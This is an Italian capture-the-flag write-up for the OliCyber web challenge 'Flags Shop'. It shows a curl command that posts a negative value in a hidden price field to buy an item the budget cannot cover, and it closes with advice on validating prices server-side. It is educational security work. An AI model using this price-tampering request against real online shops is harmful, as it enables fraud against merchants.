# Flags Shop

**Competizione:** OliCyber<br>
**Categoria:** Web / Price Tampering<br>
**URL:** http://shops.challs.olicyber.it

---

## Descrizione

> Wow questo sito vende delle 'flag' stupende, ma quella che voglio io costa troppo. Mi puoi aiutare?

Un negozio di bandiere con tre articoli disponibili e un budget iniziale di **100 €**. L'obiettivo è acquistare la bandiera degli Anonymous che costa **1000 €**, 10 volte il nostro budget.

| Articolo | Prezzo |
|---|---|
| Bandiera francese | 10 € |
| Bandiera italiana | 100 € |
| **Bandiera anonymous** | **1000 €** |

---

## Soluzione

### Step 1 — Analisi della vulnerabilità

Esaminando il codice HTML della pagina, ogni pulsante ACQUISTA invia un form via **POST** a `buy.php` con due campi hidden:

```html
<form action="buy.php" method="POST">
    <input type="hidden" name="id" value="2">
    <input type="hidden" name="costo" value="1000">
    <button type="submit">ACQUISTA</button>
</form>
```

Il campo `costo` è un input **lato client**: il browser lo invia così com'è, e il server si fida ciecamente del valore ricevuto per scalare i soldi dal credito. Non c'è alcuna validazione server-side che verifichi se il prezzo corrisponda realmente all'articolo selezionato.

Questo è un classico caso di **Client-Side Price Tampering**: manipolando il campo `costo` prima dell'invio, possiamo controllare quanto viene addebitato, incluso un **valore negativo** che invece di sottrarre... aggiunge credito.

---

### Step 2 — Identificazione della vulnerabilità

La logica server-side calcola il nuovo credito come:

```
nuovo_credito = credito_attuale - costo_ricevuto
```

Se il `costo` è negativo:

```
nuovo_credito = 100 - (-1000) = 1100 €
```

Invece di scalare fondi, ne aggiunge - e la condizione `credito >= costo` risulta sempre vera.

---

### Step 3 — Exploit con POST manipolato

Forziamo l'acquisto della bandiera anonymous (`id=2`) impostando il costo a `-1000`:

```bash
curl -s -X POST http://shops.challs.olicyber.it/buy.php \
  -d 'id=2&costo=-1000'
```

**Output del server:**

```
Ci hai truffati, ne siamo sicuri. Non ti daremo la preziosa bandiera
degli anonymous ma questa: flag{...}
```

Il server ha rilevato l'anomalia e "ironicamente" ha consegnato la flag lo stesso!

---

## Vulnerabilità sfruttata

| Aspetto | Dettaglio |
|---|---|
| **Tipo** | Client-Side Price Tampering |
| **Causa** | Il campo `costo` è controllato dal client e non validato server-side |
| **Vettore** | Modifica del parametro POST `costo` con valore negativo |
| **Impatto** | Acquisto di qualsiasi articolo a prezzo arbitrario |

---

### Perché funziona?

Il server calcola il nuovo credito come differenza tra il credito attuale e il costo ricevuto dal client. Con un costo negativo, l'operazione di sottrazione diventa un'addizione, aumentando il credito anziché diminuirlo.

---

## Conclusioni

- **Mai fidarsi dei prezzi inviati dal client** — devono essere sempre calcolati/verificati server-side
- Ricavare sempre il prezzo dal database in base all'ID dell'articolo, non dal form
- Validare che l'utente possa effettivamente permettersi l'acquisto **prima** di processarlo
- I dati inviati dal client sono sempre controllabili dall'attaccante
- Implementare un sistema di logging per rilevare transazioni sospette (credito in aumento, prezzi anomali, ecc.)
- Separare completamente la logica di presentazione dalla logica di business — il prezzo è business logic e deve restare server-side